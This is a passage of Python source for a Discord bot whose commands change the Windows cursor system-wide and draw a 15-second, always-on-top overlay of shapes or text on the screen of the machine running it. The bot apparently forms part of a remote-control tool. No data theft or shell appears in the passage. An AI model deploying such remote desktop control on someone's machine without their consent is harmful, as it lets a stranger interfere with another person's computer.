    SPI_SETCURSORS = 0x0057
    SPIF_SENDCHANGE = 0x02

    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETCURSORS, 0, cursor_path, SPIF_SENDCHANGE)
    if result:
        await ctx.send("✅ Cursor changed successfully!")
    else:
        await ctx.send("❌ Failed to change cursor.")

overlay_thread = None
overlay_running = False

def run_overlay(shapes):
    global overlay_running
    overlay_running = True

    root = tk.Tk()
    root.attributes("-topmost", True)
    root.attributes("-transparentcolor", "white")
    root.overrideredirect(True)
    root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")

    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg='white', highlightthickness=0)
    canvas.pack()

    # Create transparent image to draw on
    img = Image.new("RGBA", (root.winfo_screenwidth(), root.winfo_screenheight()), (255, 255, 255, 0))
    draw = ImageDraw.Draw(img)

    # Load a bigger font (Arial 36pt)
    try:
        font = ImageFont.truetype("arial.ttf", 64)
    except IOError:
        font = ImageFont.load_default()

    # Draw shapes (example format: [('circle', x, y, r), ('rect', x1, y1, x2, y2), ('text', x, y, 'Hello')])
    for shape in shapes:
        if shape[0] == 'circle':
            _, x, y, r = shape
            draw.ellipse([x - r, y - r, x + r, y + r], outline="red", width=3)
        elif shape[0] == 'rect':
            _, x1, y1, x2, y2 = shape
            draw.rectangle([x1, y1, x2, y2], outline="blue", width=3)
        elif shape[0] == 'text':
            _, x, y, text = shape
            draw.text((x, y), text, fill="green", font=font)

    # Convert PIL image to Tk image
    tk_img = ImageTk.PhotoImage(img)
    canvas.create_image(0, 0, anchor='nw', image=tk_img)

    def close_overlay():
        global overlay_running
        overlay_running = False
        root.destroy()

    # Close after 15 seconds automatically (adjust as needed)
    root.after(15000, close_overlay)

    root.mainloop()

@bot.command()
async def draw(ctx, shape: str, *args):
    """
    Draw a shape on the client's screen.
    Usage examples:
    !draw circle 400 300 50
    !draw rect 100 100 400 300
    !draw text 500 500 HelloWorld
    """

    global overlay_thread
    if overlay_thread and overlay_thread.is_alive():
        await ctx.send("Overlay already running. Please stop it first or wait.")
        return

    try:
        if shape.lower() == 'circle':
            x, y, r = map(int, args)
            shapes = [('circle', x, y, r)]
        elif shape.lower() == 'rect':
            x1, y1, x2, y2 = map(int, args)
            shapes = [('rect', x1, y1, x2, y2)]
        elif shape.lower() == 'text':
            x, y = map(int, args[:2])
            text = " ".join(args[2:])
            shapes = [('text', x, y, text)]
        else:
            await ctx.send("Unknown shape. Use circle, rect, or text.")
            return
    except Exception as e:
        await ctx.send(f"Invalid arguments: {e}")
        return

    await ctx.send("Opening drawing overlay for 15 seconds...")

    overlay_thread = threading.Thread(target=run_overlay, args=(shapes,), daemon=True)
    overlay_thread.start()

# Dont ask why it's in a string
other_hook = 'your token'
bot.run(other_hook)